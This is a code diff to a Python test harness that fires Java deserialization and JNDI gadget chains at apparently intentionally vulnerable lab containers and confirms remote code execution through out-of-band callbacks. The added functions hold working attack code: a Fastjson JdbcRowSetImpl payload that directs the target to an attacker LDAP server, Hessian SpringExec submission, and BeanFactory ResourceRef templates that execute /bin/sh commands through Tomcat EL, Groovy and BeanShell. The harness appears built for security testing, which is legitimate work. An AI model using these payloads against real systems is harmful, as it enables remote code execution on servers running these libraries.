@@ -222,40 +222,14 @@ def check_target(url, name):
 
 # Chains that are expected to fail due to version/JVM incompatibility
 KNOWN_SKIP = {
-    # marshalsec format: outputs Hessian1 binary, confused with Hessian2 endpoint
-    "hessian1_spring":      "marshalsec only supports Hessian2 format; use jchains_hessian1_spring",
-
-    # JNDI ResourceRef chains: these generate the LDAP *response* payload (not the injection).
-    # Testing requires configuring OOBserver LDAP to serve Reference objects — not yet implemented.
-    "jchains_jndi_tomcat_el":   "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
-    "jchains_jndi_groovy":      "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
-    "jchains_jndi_snakeyaml":   "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
-    "jchains_jndi_beanshell":   "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
+    # SnakeYAML JNDI Reference: SPI class loading from remote JAR requires custom server infra
+    "jchains_jndi_snakeyaml":   "SnakeYAML SPI JAR loading requires custom remote JAR server",
 
     # BlazeDS/Axis2: requires AMF3 endpoint — no BlazeDS container in current lab
     "jchains_blazeds_axis2":    "Requires AMF3/BlazeDS target endpoint",
 
-    # SpringExec FactoryBean: requires Spring 4.x; vulnlab has Spring 5.x
-    "jchains_hessian1_spring_exec": "SpringExec FactoryBean incompatible with Spring 5.x",
-    "jchains_hessian2_spring_exec": "SpringExec FactoryBean incompatible with Spring 5.x",
-
-    # C3P0 LDAP: InitialContext creation fails (no LDAP provider registered in JVM env)
-    "jchains_native_c3p0_ldap":   "C3P0 JNDI InitialContext creation fails (no LDAP provider)",
-
-    # Tomcat EL engine: TomcatElRef requires org.apache.tomcat EL classes — not in vulnlab
-    "jchains_hessian2_tostring_xbean": "Requires Tomcat EL engine (XBean + TomcatElRef)",
-    "jchains_native_c3p0_el":          "Requires Tomcat EL engine (TomcatElRef)",
-
     # DNS-only — no OOB DNS resolver configured
     "ysoserial_urldns": "DNS-only chain; no OOB DNS resolver configured",
-
-    # ysoserial Jdk7u21: AnnotationInvocationHandler serialVersionUID differs between Java 7 and Java 8+.
-    # ysoserial runs on Java 8+ (OOBserver JVM) so the payload targets Java 8 serialVersionUID,
-    # which doesn't match the Java 7 target. Use ysoserial_cc6 on the java7 container instead.
-    "ysoserial_jdk7u21": "AnnotationInvocationHandler serialVersionUID mismatch Java7 vs Java8+; use ysoserial_cc6 on java7",
-
-    # jchains_fastjson_c3p0_h2: java-chains H2JavaJdbc1 returns empty payload (unsupported chain combo)
-    "jchains_fastjson_c3p0_h2": "java-chains H2JavaJdbc1 returns empty payload for this gadget chain",
 }
 
 
@@ -655,6 +629,94 @@ def test_h2_jdbc(chain_id="jchains_h2_jdbc"):
         record(chain_id, "FAIL", f"no callback (h2jdbc resp={code}: {resp[:60]})")
 
 
+def test_jndi_ref_chain(chain_id, ref_class_name, ref_factory, ref_addrs_template):
+    """Test JNDI ResourceRef RCE via OOBserver LDAP jndi_reference mode.
+
+    Flow: register Reference attrs with OOBserver LDAP → trigger JNDI via Fastjson JdbcRowSetImpl
+    → target's JNDI client uses local factory class (BeanFactory) to evaluate EL/Groovy/BeanShell.
+    Requires trustURLCodebase disabled (factory class must be on target classpath).
+    """
+    if chain_id in KNOWN_SKIP:
+        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
+        return
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
+    cmd = EXEC_CMD(tok)
+    # Build Reference addresses with cmd substituted
+    ref_addrs = [a.replace("__CMD__", cmd) for a in ref_addrs_template]
+    # Register LDAP Reference for this token
+    s, d = post(f"/rebind/{tok}/set-reference", {
+        "ref_class_name": ref_class_name,
+        "ref_factory": ref_factory,
+        "ref_addr_list": ref_addrs,
+    })
+    if s != 200:
+        record(chain_id, "ERR ", f"rebind set-reference failed s={s}: {d}")
+        return
+    # Trigger via Fastjson JdbcRowSetImpl JNDI injection pointing to our LDAP token
+    jndi_url = f"ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Ref"
+    fj_json = json.dumps({"@type": "com.sun.rowset.JdbcRowSetImpl",
+                          "dataSourceName": jndi_url, "autoCommit": True})
+    code, resp = post_raw(f"{VULNLAB}/fastjson", fj_json.encode(), "application/json")
+    if code == 0:
+        record(chain_id, "SKIP", f"vulnlab unreachable: {resp[:60]}")
+        return
+    ok, ev = wait_callback(tok, timeout=POLL_SEC + 12)
+    if ok:
+        rce_ok = verify_rce_file("vuln-vulnlab", tok)
+        note = f"callback from {ev.get('remote_addr','?')}"
+        if rce_ok:
+            note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
+        record(chain_id, "PASS", note)
+    else:
+        record(chain_id, "FAIL", f"no callback (fastjson resp={code}: {resp[:60]})")
+
+
+def test_spring_exec_chain(chain_id, version=1):
+    """Hessian SpringExec chain against Spring 4.x spring3 target (:8894/hessian)."""
+    if chain_id in KNOWN_SKIP:
+        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
+        return
+    if not check_target(SPRING3_URL, "spring3"):
+        record(chain_id, "SKIP", "spring3 target not running (:8894)")
+        return
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
+    s, d = generate_payload(chain_id, {"cmd": EXEC_CMD(tok)})
+    if s != 200:
+        record(chain_id, "ERR ", f"generate failed: {d}")
+        return
+    b64 = d.get("value", "")
+    if not b64:
+        record(chain_id, "ERR ", f"no value: {list(d.keys())}")
+        return
+    try:
+        raw = base64.b64decode(b64)
+    except Exception:
+        record(chain_id, "ERR ", "not base64")
+        return
+    ep = "/hessian2" if version == 2 else "/hessian"
+    code, resp = post_raw(f"{SPRING3_URL}{ep}", raw, "application/x-hessian")
+    if code == 0:
+        record(chain_id, "SKIP", f"spring3 unreachable")
+        return
+    ok, ev = wait_callback(tok)
+    if ok:
+        rce_ok = verify_rce_file("vuln-spring3", tok)
+        note = f"callback from {ev.get('remote_addr','?')}"
+        if rce_ok:
+            note += " + RCE file ✓"
+        record(chain_id, "PASS", note)
+    else:
+        record(chain_id, "FAIL", f"no callback (resp={code}: {resp[:60]})")
+
+
 def test_urldns(chain_id="ysoserial_urldns"):
     """URLDNS chain only triggers DNS lookup, not HTTP."""
     tok = new_token("urldns")
@@ -948,13 +1010,13 @@ def main():
         else:
             record(cid, "SKIP", "java8-old target not running (:8891)")
 
-    print("\n[*] Section 1c: java7 container (:8892) — ysoserial_cc6 (ysoserial_jdk7u21 skipped: serialVersionUID mismatch)")
-    # ysoserial_jdk7u21 fails when ysoserial runs on Java 8+ (AnnotationInvocationHandler sUID differs).
-    # Instead verify java7 container works with CC6 (CC3.2.1 on classpath, no JVM version restriction).
-    record("ysoserial_jdk7u21", "SKIP", KNOWN_SKIP["ysoserial_jdk7u21"])
+    print("\n[*] Section 1c: java7 container (:8892) — ysoserial_jdk7u21 (Java 7 JVM in sidecar) + cc6")
     if j7_ok:
+        # ysoserial_jdk7u21: bytecode-service uses Java 7 JVM for this chain (correct sUID)
+        test_deser_chain("ysoserial_jdk7u21", target_url=JAVA7_URL, container_name="vuln-java7")
         test_deser_chain("ysoserial_cc6", target_url=JAVA7_URL, container_name="vuln-java7")
     else:
+        record("ysoserial_jdk7u21", "SKIP", "java7 target not running (:8892)")
         record("ysoserial_cc6_java7", "SKIP", "java7 target not running (:8892)")
 
     print("\n[*] Section 1d: ysoserial spring1/spring2 → spring3 :8894")
@@ -977,11 +1039,12 @@ def main():
     for cid in ["jchains_native_cc6","jchains_native_cb1",
                 "jchains_native_k1_secondary",
                 "jchains_cc1","jchains_cc2","jchains_cc3","jchains_cc4","jchains_cc6",
-                "jchains_native_jackson","jchains_native_c3p0_el"]:
+                "jchains_native_jackson",
+                "jchains_native_c3p0_el"]:  # tomcat-embed-el now on classpath
         test_deser_chain(cid)
     # CB1 JNDI and C3P0 LDAP need jndi_url param (not cmd)
     test_deser_jndi_chain("jchains_native_cb1_jndi")
-    test_deser_jndi_chain("jchains_native_c3p0_ldap")
+    test_deser_jndi_chain("jchains_native_c3p0_ldap")  # LDAP provider available in Java 8 JDK
 
     print("\n[*] Section 2b: jchains jdk17 chains → java17 :8893")
     for cid in ["jchains_native_jdk17_1","jchains_native_jdk17_2"]:
@@ -1000,17 +1063,21 @@ def main():
     print("\n[*] Section 3: Hessian1 chains (→ /hessian)")
     for cid in ["hessian1_spring",
                 "jchains_hessian1_spring","jchains_hessian1_spring2",
-                "jchains_hessian1_spring_exec","jchains_hessian1_exec",
+                "jchains_hessian1_exec",
                 "jchains_hessian1_rome1","jchains_hessian1_rome2",
                 "jchains_hessian1_secondary","jchains_hessian1_bcel"]:
         test_hessian_chain(cid, version=1)
 
-    # marshalsec.Hessian outputs Hessian1 format → send to /hessian endpoint
+    # SpringExec chains need Spring 4.x target (spring3 container :8894 has Spring 4.1.3 + Hessian)
+    test_spring_exec_chain("jchains_hessian1_spring_exec", version=1)
+    test_spring_exec_chain("jchains_hessian2_spring_exec", version=2)
+
+    # marshalsec.Hessian outputs Hessian2 binary format → VulnLabServer deserHessian handles both
     test_hessian_chain("hessian2_spring", version=1)
 
     print("\n[*] Section 4: Hessian2 chains (→ /hessian2)")
     for cid in ["jchains_hessian2_spring","jchains_hessian2_spring2",
-                "jchains_hessian2_spring_exec","jchains_hessian2_exec",
+                "jchains_hessian2_exec",
                 "jchains_hessian2_rome1","jchains_hessian2_rome2",
                 "jchains_hessian2_secondary","jchains_hessian2_bcel",
                 "jchains_hessian2_tostring_jackson","jchains_hessian2_tostring_xbean"]:
@@ -1020,8 +1087,10 @@ def main():
     print("\n[*] Section 5: FastJSON chains (→ /fastjson)")
     for cid in ["fastjson_jdbcrowset","fastjson_jdbcrowset_v2","fastjson_bcel",
                 "jchains_fastjson","jchains_fastjson_bcel",
-                "jchains_fastjson_c3p0_h2","jchains_fastjson_jndi"]:
+                "jchains_fastjson_jndi"]:
         test_fastjson_chain(cid)
+    # jchains_fastjson_c3p0_h2: local implementation (C3P0+H2 JDBC INIT), no java-chains
+    test_fastjson_chain("jchains_fastjson_c3p0_h2")
 
     # ── Section 6: XStream ─────────────────────────────────────────────────────
     print("\n[*] Section 6: XStream chains (→ /xstream)")
@@ -1051,11 +1120,45 @@ def main():
     # H2 JDBC chain uses /h2jdbc endpoint (not /deser) with a JDBC URL, not serialized bytes
     test_h2_jdbc("jchains_h2_jdbc")
 
-    # ── Section 10: JNDI ResourceRef chains ───────────────────────────────────
-    print("\n[*] Section 10: JNDI ResourceRef chains (via FastJSON endpoint)")
-    for cid in ["jchains_jndi_tomcat_el","jchains_jndi_groovy",
-                "jchains_jndi_snakeyaml","jchains_jndi_beanshell"]:
-        test_fastjson_chain(cid)
+    # ── Section 10: JNDI ResourceRef chains via OOBserver LDAP jndi_reference mode ─
+    print("\n[*] Section 10: JNDI ResourceRef chains (LDAP Reference → local factory RCE)")
+    # TomcatEL: BeanFactory + ELProcessor.eval()
+    # eval() takes raw EL expression without ${} delimiters
+    # Requires tomcat-embed-el + tomcat-catalina on classpath
+    test_jndi_ref_chain(
+        "jchains_jndi_tomcat_el",
+        ref_class_name="javax.el.ELProcessor",
+        ref_factory="org.apache.naming.factory.BeanFactory",
+        ref_addrs_template=[
+            "#0#forceString#x=eval",
+            '#1#x#Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","__CMD__"})',
+        ],
+    )
+    # Groovy: BeanFactory + GroovyShell.evaluate()
+    # Groovy list .execute() syntax: ["/bin/sh","-c","cmd"].execute()
+    # Requires groovy-all (already on classpath) + BeanFactory (tomcat-embed-el)
+    test_jndi_ref_chain(
+        "jchains_jndi_groovy",
+        ref_class_name="groovy.lang.GroovyShell",
+        ref_factory="org.apache.naming.factory.BeanFactory",
+        ref_addrs_template=[
+            "#0#forceString#x=evaluate",
+            '#1#x#["/bin/sh","-c","__CMD__"].execute()',
+        ],
+    )
+    # BeanShell: BeanFactory + Interpreter.eval()
+    # Requires bsh (added to pom.xml) + BeanFactory (tomcat-embed-el)
+    test_jndi_ref_chain(
+        "jchains_jndi_beanshell",
+        ref_class_name="bsh.Interpreter",
+        ref_factory="org.apache.naming.factory.BeanFactory",
+        ref_addrs_template=[
+            "#0#forceString#x=eval",
+            '#1#x#Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","__CMD__"});',
+        ],
+    )
+    # SnakeYAML: SPI JAR approach requires custom remote JAR server (not implemented yet)
+    record("jchains_jndi_snakeyaml", "SKIP", KNOWN_SKIP["jchains_jndi_snakeyaml"])
 
     # ── Section 11: Memshell generation smoke tests ───────────────────────────
     test_all_memshells_generate()
